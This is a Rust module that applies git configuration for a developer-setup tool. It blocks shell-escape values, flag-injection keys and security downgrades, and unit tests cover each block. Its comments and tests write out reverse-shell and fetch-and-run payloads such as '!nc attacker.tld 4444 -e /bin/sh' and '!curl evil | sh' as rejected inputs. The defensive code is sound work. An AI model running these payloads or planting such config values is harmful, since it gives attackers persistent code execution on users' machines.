//! Git configuration setup - applies git config settings

use std::path::{Path, PathBuf};
use std::process::Command;

use thiserror::Error;

use super::config::{ConfigScope, GitConfig, SigningFormat};

/// Errors that can occur during git configuration
#[derive(Debug, Error)]
pub enum GitError {
    #[error("Failed to set git config '{0}': {1}")]
    ConfigFailed(String, String),

    #[error("Git command failed: {0}")]
    CommandFailed(#[from] std::io::Error),

    #[error("Git not installed")]
    GitNotInstalled,

    #[error("Signing key not found: {0}")]
    #[allow(dead_code)] // Reserved for future validation
    SigningKeyNotFound(String),

    /// A `[git]` config value was refused because git would interpret it as a
    /// shell command. The classic exploit:
    ///
    ///   [git]
    ///   credential_helper = "!nc attacker.tld 4444 -e /bin/sh"
    ///
    /// Git's `!`-prefix syntax executes the value as a shell command on every
    /// `git push` / `git commit`, persisting RCE outside Jarvy's control window.
    /// We refuse `!`-prefixed values for the security-sensitive keys
    /// (`credential.helper`, `core.editor`, `core.pager`, `core.sshCommand`)
    /// and for any `alias.*` unless `JARVY_ALLOW_SHELL_ALIASES=1` is set.
    #[error("Refused dangerous git config '{0}': {1}")]
    RefusedDangerousConfig(String, String),

    /// A `[git.extra]` key was rejected before reaching `git config`. Keys are
    /// free-form, so a malformed or hostile config could otherwise pass a value
    /// that git parses as an option (e.g. `--global`, `-f`) rather than a
    /// config key. See `validate_extra_key` for the grammar we enforce.
    #[error("Invalid git config key '{0}': {1}")]
    InvalidConfigKey(String, String),
}

/// Validate a free-form `[git.extra]` key before handing it to `git config`.
///
/// git parses options anywhere on its command line, so a key like `--global`
/// or `-f` in the key position could change the command's meaning. We require
/// the canonical dotted grammar and reject anything that could be read as a
/// flag. Enforced rules:
/// - non-empty, ≤ 256 bytes
/// - ASCII only; every char in `[A-Za-z0-9._-]`
/// - must not start with `-` (flag-injection guard)
/// - at least one `.` (git config keys are always `section.key`)
/// - no leading/trailing `.` and no empty `..` segment
fn validate_extra_key(key: &str) -> Result<(), GitError> {
    let invalid = |reason: &str| {
        Err(GitError::InvalidConfigKey(
            key.to_string(),
            reason.to_string(),
        ))
    };

    if key.is_empty() {
        return invalid("key is empty");
    }
    if key.len() > 256 {
        return invalid("key exceeds 256 bytes");
    }
    if key.starts_with('-') {
        return invalid("key must not start with '-' (would be parsed as a git option)");
    }
    if !key.contains('.') {
        return invalid("git config keys must be dotted, e.g. `section.key`");
    }
    if key.starts_with('.') || key.ends_with('.') || key.contains("..") {
        return invalid("key has an empty section or subsection segment");
    }
    if !key
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'_')
    {
        return invalid("key contains characters outside [A-Za-z0-9._-]");
    }
    Ok(())
}

/// Refuse `[git.extra]` values that weaken a git security guardrail. Each of
/// these keys defends against a known attack class; setting it the wrong way
/// re-opens the hole, so we reject the weakening direction unless
/// `JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1` is set. Non-matching keys pass through.
///
/// - `core.protectNTFS` / `core.protectHFS` = falsey → re-enables `.git`-path
///   smuggling (NTFS 8.3 short-names, HFS+ ignorable code points). Default on.
/// - `safe.directory = *` → disables repository-ownership verification wholesale
///   (CVE-2022-24765). A specific path is fine; the `*` wildcard is not.
/// - `fsck.<msg-id> = ignore` → silences object-integrity validation. `warn` /
///   `error` are allowed; `ignore` is the dangerous setting.
fn check_not_protect_downgrade(key: &str, value: &str) -> Result<(), GitError> {
    let allow = std::env::var("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE")
        .map(|v| v == "1" || v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("yes"))
        .unwrap_or(false);
    if allow {
        return Ok(());
    }

    let trimmed = value.trim();
    let is_falsey = matches!(
        trimmed.to_ascii_lowercase().as_str(),
        "false" | "0" | "no" | "off" | ""
    );
    let key_lower = key.to_ascii_lowercase();

    let refuse = |reason: &str| -> Result<(), GitError> {
        tracing::warn!(
            event = "git.config.refused_protect_downgrade",
            key = %key,
            "refused `[git.extra]` value that weakens a git security guardrail"
        );
        Err(GitError::RefusedDangerousConfig(
            key.to_string(),
            reason.to_string(),
        ))
    };

    match key_lower.as_str() {
        "core.protectntfs" | "core.protecthfs" if is_falsey => refuse(
            "disabling core.protectNTFS/protectHFS re-opens `.git` path-smuggling attacks; \
             set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1 to override",
        ),
        "safe.directory" if trimmed == "*" => refuse(
            "`safe.directory = *` disables repo-ownership verification (CVE-2022-24765); \
             pin a specific path instead, or set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1",
        ),
        _ if key_lower.starts_with("fsck.") && trimmed.eq_ignore_ascii_case("ignore") => refuse(
            "setting an fsck.* check to `ignore` silences object-integrity validation; \
             use `warn`/`error`, or set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1",
        ),
        _ => Ok(()),
    }
}

/// Git config keys whose values git interprets as shell commands when the
/// value begins with `!`. A malicious `jarvy.toml` can use any of these to
/// stage persistent RCE on every `git push` / `git commit`.
const GIT_SHELL_INTERPRETED_KEYS: &[&str] = &[
    "credential.helper",
    "core.editor",
    "core.pager",
    "core.sshCommand",
    // sequence.editor, mergetool/difftool also accept ! values; keep narrow
    // for now and grow if a real user pattern needs it.
];

/// Returns true if the given value would be executed as a shell command by
/// git when stored under one of the shell-interpreted config keys.
fn value_is_shell_escape(value: &str) -> bool {
    // Git treats values starting with `!` as shell. Leading whitespace is
    // not stripped by git, so `" !cmd"` is NOT a shell value — but the
    // attacker has no reason to add leading whitespace, so reject the
    // common form.
    value.starts_with('!')
}

/// Git setup handler
pub struct GitSetup {
    config: GitConfig,
    project_dir: Option<PathBuf>,
    quiet: bool,
}

impl GitSetup {
    /// Create a new GitSetup with the given configuration
    pub fn new(config: GitConfig) -> Self {
        Self {
            config,
            project_dir: None,
            quiet: false,
        }
    }

    /// Set the project directory for local scope configurations
    #[allow(dead_code)] // Builder pattern for advanced usage
    pub fn with_project_dir(mut self, dir: PathBuf) -> Self {
        self.project_dir = Some(dir);
        self
    }

    /// Set quiet mode (suppress output)
    #[allow(dead_code)] // Builder pattern for quiet mode
    pub fn quiet(mut self, quiet: bool) -> Self {
        self.quiet = quiet;
        self
    }

    /// Check if git is installed
    pub fn check_git_installed() -> Result<(), GitError> {
        let output = Command::new("git").arg("--version").output()?;

        if !output.status.success() {
            return Err(GitError::GitNotInstalled);
        }
        Ok(())
    }

    /// Apply all git configuration settings
    pub fn configure(&self) -> Result<(), GitError> {
        Self::check_git_installed()?;

        // Configure identity
        self.configure_identity()?;

        // Configure signing if enabled
        if self.config.signing {
            self.configure_signing()?;
        }

        // Configure defaults
        self.configure_defaults()?;

        // Configure editor
        if let Some(ref editor) = self.config.editor {
            self.set_config("core.editor", editor)?;
        }

        // Configure line endings
        self.configure_line_endings()?;

        // Configure credential helper
        self.configure_credential_helper()?;

        // Apply OS-aware defaults for keys the user left unset (autocrlf,
        // Windows longpaths, macOS precomposeunicode). Before aliases/extra so
        // `[git.extra]` still wins.
        self.configure_os_defaults()?;

        // Configure aliases
        self.configure_aliases()?;

        // Apply free-form escape-hatch keys last so they can override any
        // modeled field targeting the same git config key.
        self.configure_extra()?;

        Ok(())
    }

    /// Apply free-form `[git.extra]` keys. Each key is validated for grammar /
    /// flag-injection, then written through `set_config` (which still refuses
    /// `!`-shell values). Iterate sorted so output ordering is deterministic.
    fn configure_extra(&self) -> Result<(), GitError> {
        let mut keys: Vec<&String> = self.config.extra.keys().collect();
        keys.sort();
        for key in keys {
            validate_extra_key(key)?;
            let value = &self.config.extra[key];
            // Refuse values that weaken a security guardrail (protectNTFS/HFS,
            // safe.directory=*, fsck.*=ignore) before anything is written.
            check_not_protect_downgrade(key, value)?;
            // `set_config` only refuses `!` for the narrow known-shell key list
            // and aliases. Extra keys are free-form and many git keys
            // (`core.fsmonitor`, `core.hooksPath`, mergetool/difftool cmds, …)
            // execute `!`-values, so refuse the whole class here rather than
            // chase an enumeration we can't keep complete.
            if value_is_shell_escape(value) {
                tracing::warn!(
                    event = "git.config.refused_shell_escape",
                    key = %key,
                    "refused `[git.extra]` value starting with `!` (git would run it as a shell command)"
                );
                return Err(GitError::RefusedDangerousConfig(
                    key.clone(),
                    "values starting with `!` are interpreted by git as a shell command; \
                     refusing to set this from `[git.extra]` in jarvy.toml"
                        .to_string(),
                ));
            }
            self.set_config(key, value)?;
        }
        Ok(())
    }

    /// Configure user identity (name and email)
    fn configure_identity(&self) -> Result<(), GitError> {
        if let Some(ref name) = self.config.user_name {
            if let Some(value) = name.resolve() {
                self.set_config("user.name", &value)?;
            }
        }

        if let Some(ref email) = self.config.user_email {
            if let Some(value) = email.resolve() {
                self.set_config("user.email", &value)?;
            }
        }

        Ok(())
    }

    /// Configure commit signing
    fn configure_signing(&self) -> Result<(), GitError> {
        self.set_config("commit.gpgsign", "true")?;

        if let Some(ref key) = self.config.signing_key {
            // Expand tilde in path
            let key_path = shellexpand::tilde(key);

            // Auto-detect format if not specified
            let format = self.config.signing_format.unwrap_or_else(|| {
                if key_path.ends_with(".pub") {
                    SigningFormat::Ssh
                } else {
                    SigningFormat::Gpg
                }
            });

            match format {
                SigningFormat::Ssh => {
                    self.set_config("gpg.format", "ssh")?;
                    self.set_config("user.signingkey", &key_path)?;
                }
                SigningFormat::Gpg => {
                    self.set_config("user.signingkey", &key_path)?;
                }
            }
        }

        Ok(())
    }

    /// Configure default settings (branch, pull strategy, etc.)
    fn configure_defaults(&self) -> Result<(), GitError> {
        if let Some(ref branch) = self.config.default_branch {
            self.set_config("init.defaultBranch", branch)?;
        }

        if self.config.pull_rebase {
            self.set_config("pull.rebase", "true")?;
        }

        if self.config.auto_stash {
            self.set_config("rebase.autoStash", "true")?;
        }

        if self.config.push_autosetup {
            self.set_config("push.autoSetupRemote", "true")?;
        }

        Ok(())
    }

    /// The `core.autocrlf` value appropriate for the host OS: Windows checks
    /// out CRLF and commits LF (`true`); Unix commits LF untouched (`input`).
    fn os_default_autocrlf() -> &'static str {
        if cfg!(target_os = "windows") {
            "true"
        } else {
            "input"
        }
    }

    /// Apply OS-appropriate git config defaults for keys the user didn't set
    /// explicitly. Mirrors the always-on per-OS `credential.helper` default:
    /// host-aware values most repos want but rarely set by hand. Skipped
    /// entirely when `os_defaults = false`. Every key here is guarded so a
    /// typed field (checked before defaulting) or a `[git.extra]` entry
    /// (applied afterward) always wins — we never overwrite an explicit value.
    fn configure_os_defaults(&self) -> Result<(), GitError> {
        if !self.config.os_defaults.unwrap_or(true) {
            return Ok(());
        }

        // Line endings: only default when `autocrlf` is unset AND not steered
        // via `[git.extra]` (which would just re-set it moments later).
        if self.config.autocrlf.is_none() && !self.config.extra.contains_key("core.autocrlf") {
            let value = Self::os_default_autocrlf();
            tracing::debug!(
                event = "git.config.os_default_applied",
                key = "core.autocrlf",
                value = %value,
            );
            self.set_config("core.autocrlf", value)?;
        }

        // Windows: allow paths longer than the 260-char MAX_PATH limit. The key
        // is inert on other platforms, so we scope it with cfg! to avoid noise.
        #[cfg(target_os = "windows")]
        {
            if !self.config.extra.contains_key("core.longpaths") {
                tracing::debug!(
                    event = "git.config.os_default_applied",
                    key = "core.longpaths",
                    value = "true",
                );
                self.set_config("core.longpaths", "true")?;
            }
        }

        // macOS: APFS/HFS+ store filenames decomposed (NFD); recompose to NFC so
        // filenames match those committed on Linux/Windows.
        #[cfg(target_os = "macos")]
        {
            if !self.config.extra.contains_key("core.precomposeunicode") {
                tracing::debug!(
                    event = "git.config.os_default_applied",
                    key = "core.precomposeunicode",
                    value = "true",
                );
                self.set_config("core.precomposeunicode", "true")?;
            }
        }

        // Cross-platform recommended defaults — not OS-specific, but sane for
        // most repos and cheap to reverse. Same opt-out (`os_defaults = false`)
        // and same `[git.extra]`-wins override rule as the host-aware keys.
        // `merge.conflictStyle = zdiff3` needs git >= 2.35; older git ignores
        // the unknown style at merge time rather than erroring on write.
        const RECOMMENDED_DEFAULTS: &[(&str, &str)] = &[
            ("fetch.prune", "true"),           // drop refs deleted on the remote
            ("rerere.enabled", "true"),        // reuse recorded conflict resolutions
            ("merge.conflictStyle", "zdiff3"), // show the common base in conflicts
        ];
        for (key, value) in RECOMMENDED_DEFAULTS {
            if !self.config.extra.contains_key(*key) {
                tracing::debug!(
                    event = "git.config.os_default_applied",
                    key = %key,
                    value = %value,
                );
                self.set_config(key, value)?;
            }
        }

        Ok(())
    }

    /// Configure line ending settings
    fn configure_line_endings(&self) -> Result<(), GitError> {
        if let Some(ref autocrlf) = self.config.autocrlf {
            self.set_config("core.autocrlf", autocrlf.as_str())?;
        }

        if let Some(ref eol) = self.config.eol {
            self.set_config("core.eol", eol)?;
        }

        Ok(())
    }

    /// Configure credential helper (auto-detect based on OS if not specified)
    fn configure_credential_helper(&self) -> Result<(), GitError> {
        let helper = self
            .config
            .credential_helper
            .as_deref()
            .unwrap_or_else(|| Self::default_credential_helper());

        self.set_config("credential.helper", helper)?;
        Ok(())
    }

    /// Configure git aliases
    fn configure_aliases(&self) -> Result<(), GitError> {
        for (alias, command) in &self.config.aliases {
            self.set_config(&format!("alias.{alias}"), command)?;
        }
        Ok(())
    }

    /// Set a single git config value
    fn set_config(&self, key: &str, value: &str) -> Result<(), GitError> {
        // Refuse `!`-prefixed values for keys git interprets as shell.
        // See `RefusedDangerousConfig` for the threat model.
        if value_is_shell_escape(value) {
            let is_alias = key.starts_with("alias.");
            let is_shell_key = GIT_SHELL_INTERPRETED_KEYS.contains(&key);
            if is_shell_key {
                tracing::warn!(
                    event = "git.config.refused_shell_escape",
                    key = %key,
                    "refused git config value starting with `!` for shell-interpreted key"
                );
                return Err(GitError::RefusedDangerousConfig(
                    key.to_string(),
                    "values starting with `!` are interpreted by git as a shell command; \
                     refusing to set this from jarvy.toml"
                        .to_string(),
                ));
            }
            if is_alias {
                let allow = std::env::var("JARVY_ALLOW_SHELL_ALIASES")
                    .map(|v| {
                        v == "1" || v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("yes")
                    })
                    .unwrap_or(false);
                if !allow {
                    tracing::warn!(
                        event = "git.config.refused_shell_alias",
                        alias = %key,
                        "refused git alias starting with `!` (set JARVY_ALLOW_SHELL_ALIASES=1 to allow)"
                    );
                    return Err(GitError::RefusedDangerousConfig(
                        key.to_string(),
                        "git aliases starting with `!` execute as shell on `git <alias>`; \
                         set JARVY_ALLOW_SHELL_ALIASES=1 to allow"
                            .to_string(),
                    ));
                }
            }
        }

        let scope_flag = match self.config.scope {
            ConfigScope::Global => "--global",
            ConfigScope::Local => "--local",
        };

        let mut cmd = Command::new("git");
        cmd.args(["config", scope_flag, key, value]);

        if let Some(ref dir) = self.project_dir {
            cmd.current_dir(dir);
        }

        let output = cmd.output()?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(GitError::ConfigFailed(key.to_string(), stderr.to_string()));
        }

        if !self.quiet {
            println!("  Set git config {key}: {value}");
        }

        Ok(())
    }

    /// Get the default credential helper for the current OS
    fn default_credential_helper() -> &'static str {
        #[cfg(target_os = "macos")]
        {
            "osxkeychain"
        }

        #[cfg(target_os = "linux")]
        {
            "cache"
        }

        #[cfg(target_os = "windows")]
        {
            "manager-core"
        }

        #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
        {
            "cache"
        }
    }
}

/// Get a current git config value
#[allow(dead_code)] // Public API for config inspection
pub fn get_git_config(key: &str, scope: ConfigScope) -> Option<String> {
    let scope_flag = match scope {
        ConfigScope::Global => "--global",
        ConfigScope::Local => "--local",
    };

    let output = Command::new("git")
        .args(["config", scope_flag, "--get", key])
        .output()
        .ok()?;

    if output.status.success() {
        Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
    } else {
        None
    }
}

/// Check if a signing key file exists
#[allow(dead_code)] // Public API for key validation
pub fn signing_key_exists(key_path: &str) -> bool {
    let expanded = shellexpand::tilde(key_path);
    Path::new(expanded.as_ref()).exists()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::git::config::AutoCrlf;

    #[test]
    fn test_default_credential_helper() {
        let helper = GitSetup::default_credential_helper();
        // Should return a valid helper name
        assert!(!helper.is_empty());
    }

    #[test]
    fn test_git_setup_builder() {
        let config = GitConfig::default();
        let setup = GitSetup::new(config.clone())
            .with_project_dir(PathBuf::from("/tmp/test"))
            .quiet(true);

        assert!(setup.quiet);
        assert_eq!(setup.project_dir, Some(PathBuf::from("/tmp/test")));
    }

    #[test]
    fn test_autocrlf_as_str() {
        assert_eq!(AutoCrlf::True.as_str(), "true");
        assert_eq!(AutoCrlf::False.as_str(), "false");
        assert_eq!(AutoCrlf::Input.as_str(), "input");
    }

    #[test]
    fn value_is_shell_escape_detects_bang_prefix() {
        assert!(value_is_shell_escape("!nc attacker 4444 -e /bin/sh"));
        assert!(value_is_shell_escape("!"));
        assert!(!value_is_shell_escape("/usr/bin/vim"));
        assert!(!value_is_shell_escape("osxkeychain"));
        assert!(!value_is_shell_escape("checkout"));
    }

    #[test]
    fn set_config_refuses_bang_credential_helper() {
        // Build a setup that won't actually invoke git (we hit the refusal
        // before the Command::output call).
        let cfg = GitConfig::default();
        let setup = GitSetup::new(cfg);
        let err = setup
            .set_config("credential.helper", "!nc evil 4444 -e /bin/sh")
            .unwrap_err();
        match err {
            GitError::RefusedDangerousConfig(k, _) => assert_eq!(k, "credential.helper"),
            other => panic!("expected RefusedDangerousConfig, got {other:?}"),
        }
    }

    #[test]
    fn set_config_refuses_bang_core_editor() {
        let setup = GitSetup::new(GitConfig::default());
        assert!(matches!(
            setup.set_config("core.editor", "!/tmp/payload.sh"),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    #[test]
    fn set_config_refuses_bang_alias_without_env_opt_in() {
        // Ensure env not set; this test is racy with parallel tests setting
        // the same var, so we just refuse to assert if it happens to be set.
        if std::env::var("JARVY_ALLOW_SHELL_ALIASES").is_ok() {
            return;
        }
        let setup = GitSetup::new(GitConfig::default());
        assert!(matches!(
            setup.set_config("alias.x", "!curl evil | sh"),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    /// Round-2 QA item 16: every entry in `GIT_SHELL_INTERPRETED_KEYS`
    /// must refuse `!`-prefixed values. Loops over the constant so that
    /// adding a new entry there gets coverage automatically — without
    /// this, a future entry could regress to "no refusal" silently.
    #[test]
    fn every_shell_interpreted_key_refuses_bang_prefix() {
        let setup = GitSetup::new(GitConfig::default());
        for key in GIT_SHELL_INTERPRETED_KEYS {
            let err = setup.set_config(key, "!evil").unwrap_err_or_else_panic();
            match err {
                GitError::RefusedDangerousConfig(k, _) => assert_eq!(k, *key),
                other => panic!("expected RefusedDangerousConfig for {key}, got {other:?}"),
            }
        }
    }

    #[test]
    fn validate_extra_key_accepts_dotted_keys() {
        assert!(validate_extra_key("core.fsmonitor").is_ok());
        assert!(validate_extra_key("feature.manyFiles").is_ok());
        assert!(validate_extra_key("url.https://github.com/.insteadOf").is_err()); // colon/slash rejected
        assert!(validate_extra_key("diff.colorMoved").is_ok());
        assert!(validate_extra_key("branch.main.rebase").is_ok());
    }

    #[test]
    fn validate_extra_key_rejects_flag_injection() {
        assert!(matches!(
            validate_extra_key("--global"),
            Err(GitError::InvalidConfigKey(_, _))
        ));
        assert!(matches!(
            validate_extra_key("-f"),
            Err(GitError::InvalidConfigKey(_, _))
        ));
    }

    #[test]
    fn validate_extra_key_rejects_malformed_grammar() {
        assert!(validate_extra_key("").is_err());
        assert!(validate_extra_key("nodots").is_err());
        assert!(validate_extra_key(".leading").is_err());
        assert!(validate_extra_key("trailing.").is_err());
        assert!(validate_extra_key("double..dot").is_err());
        assert!(validate_extra_key("has space.key").is_err());
        assert!(validate_extra_key("shell$.key").is_err());
    }

    #[test]
    fn os_default_autocrlf_matches_host() {
        let expected = if cfg!(target_os = "windows") {
            "true"
        } else {
            "input"
        };
        assert_eq!(GitSetup::os_default_autocrlf(), expected);
    }

    #[test]
    fn configure_os_defaults_opt_out_makes_no_git_calls() {
        // os_defaults = false must early-return without shelling out to git,
        // so this is safe to run without touching the real global config.
        let cfg = GitConfig {
            os_defaults: Some(false),
            ..GitConfig::default()
        };
        let setup = GitSetup::new(cfg);
        assert!(setup.configure_os_defaults().is_ok());
    }

    #[test]
    fn configure_extra_refuses_bang_value_for_arbitrary_key() {
        // `core.fsmonitor` is NOT in GIT_SHELL_INTERPRETED_KEYS, but the
        // escape-hatch path refuses `!`-values for every key.
        let mut cfg = GitConfig::default();
        cfg.extra
            .insert("core.fsmonitor".to_string(), "!evil.sh".to_string());
        let setup = GitSetup::new(cfg);
        assert!(matches!(
            setup.configure_extra(),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    #[test]
    fn check_protect_downgrade_refuses_weakening() {
        // Guarded by the env escape hatch; skip if a parallel test/CI set it.
        if std::env::var("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE").is_ok() {
            return;
        }
        assert!(check_not_protect_downgrade("core.protectNTFS", "false").is_err());
        assert!(check_not_protect_downgrade("core.protectHFS", "off").is_err());
        assert!(check_not_protect_downgrade("safe.directory", "*").is_err());
        assert!(check_not_protect_downgrade("fsck.zeroPaddedFilemode", "ignore").is_err());
        // Case-insensitive on both key and value.
        assert!(check_not_protect_downgrade("CORE.PROTECTNTFS", "NO").is_err());
    }

    #[test]
    fn check_protect_downgrade_allows_safe_values() {
        if std::env::var("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE").is_ok() {
            return;
        }
        assert!(check_not_protect_downgrade("core.protectNTFS", "true").is_ok());
        assert!(check_not_protect_downgrade("safe.directory", "/srv/repo").is_ok());
        assert!(check_not_protect_downgrade("fsck.zeroPaddedFilemode", "warn").is_ok());
        // Unrelated keys are never touched.
        assert!(check_not_protect_downgrade("core.fsmonitor", "false").is_ok());
    }

    #[test]
    fn configure_extra_refuses_protect_downgrade() {
        if std::env::var("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE").is_ok() {
            return;
        }
        let mut cfg = GitConfig::default();
        cfg.extra
            .insert("core.protectNTFS".to_string(), "false".to_string());
        let setup = GitSetup::new(cfg);
        assert!(matches!(
            setup.configure_extra(),
            Err(GitError::RefusedDangerousConfig(_, _))
        ));
    }

    #[test]
    fn configure_extra_rejects_bad_key_before_running_git() {
        let mut cfg = GitConfig::default();
        cfg.extra.insert("--global".to_string(), "true".to_string());
        let setup = GitSetup::new(cfg);
        assert!(matches!(
            setup.configure_extra(),
            Err(GitError::InvalidConfigKey(_, _))
        ));
    }

    /// Helper trait so the loop above reads naturally.
    trait UnwrapErrOrPanic<T, E: std::fmt::Debug> {
        fn unwrap_err_or_else_panic(self) -> E;
    }
    impl<T: std::fmt::Debug, E: std::fmt::Debug> UnwrapErrOrPanic<T, E> for Result<T, E> {
        fn unwrap_err_or_else_panic(self) -> E {
            match self {
                Ok(v) => panic!("expected Err, got Ok({v:?})"),
                Err(e) => e,
            }
        }
    }
}
